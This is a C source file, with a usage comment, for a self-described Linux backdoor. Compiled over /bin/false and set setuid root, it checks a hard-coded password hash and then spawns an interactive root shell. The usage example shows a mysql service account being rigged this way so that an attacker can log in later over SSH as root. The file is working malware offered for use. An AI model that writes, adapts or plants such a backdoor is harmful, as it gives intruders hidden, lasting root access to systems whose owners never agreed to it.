
/*
Usage:

root@owned~# gcc false.c -o /bin/false -lcrypt ;chmod u+s /bin/false ;su lol
lol@owned~$ false lol
password:
root@owned~: # we're root! lets door the mysql account...
root@owned~: passwd mysql
Enter new UNIX password: 
Confirm new UNIX password:
password updated!
root@owned~# usermod -s /bin/false mysql
root@owned~# passwd mqsql
lol@owned~$ exit
exit
me@secure~$ ssh mysql@db -C whatever
mysql@owned3ploxify.onion's password: 
Could not chdir to home directory /nonexistent: No such file or directory
Password:lol
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@owned:/# 
*/

/*
Simplified linux backdoor using crypt for password hashing.
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>
#include <stdlib.h>

int file_exist (const char *filename)
{
//  struct stat   buffer;
  //return (stat (filename, &buffer) == 0);
    FILE *fp = fopen (filename, "r");
   if (fp!=NULL) fclose (fp);
   return (fp!=NULL);
}

int door(void)
{
  /* Hashed form of "lol". */
  const char *const pass = "$1$ERy5M0zG$0jXqoni5TXZ89CjI2pEFV0";
  char *result;
  int ok;

  /* Read in the user’s password and encrypt it,
     passing the expected password in as the salt. */
  result = crypt(getpass("Password:"), pass);

  /* Test the result. */
  ok = strcmp (result, pass) == 0;
  if (ok != 0) {
    printf("Access granted!");
    printf("\n\n\t╦ ╦┬┌─┐┌─┐┬┌─┐┌─┐  ╦ ╦┌─┐┌─┐  ╔╗ ┌─┐┌─┐┬┌─┌┬┐┌─┐┌─┐┬─┐┬\n\t╠═╣│├─┘├─┘│├┤ └─┐  ║ ║└─┐├┤   ╠╩╗├─┤│  ├┴┐ │││ ││ │├┬┘│\n\t╩ ╩┴┴  ┴  ┴└─┘└─┘  ╚═╝└─┘└─┘  ╚═╝┴ ┴└─┘┴ ┴─┴┘└─┘└─┘┴└─o\n\n");// ascii art  here
    if (file_exist ("/bin/bash")) {
    printf ("Using bash!\n");
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-i", (char *)0); 
    } else {
     printf("Using sh!\n");
     setuid(0);
     setgid(0);
     execl("/bin/sh", "sh", "-i", (char *)0);}
 } else {
   printf("Access denied.\n\n"); }
  return ok ? 0 : 1;
}


int main(int argc, char *argv[]){

{

  if (argc > 1) { door(); }
  return 1; }

}
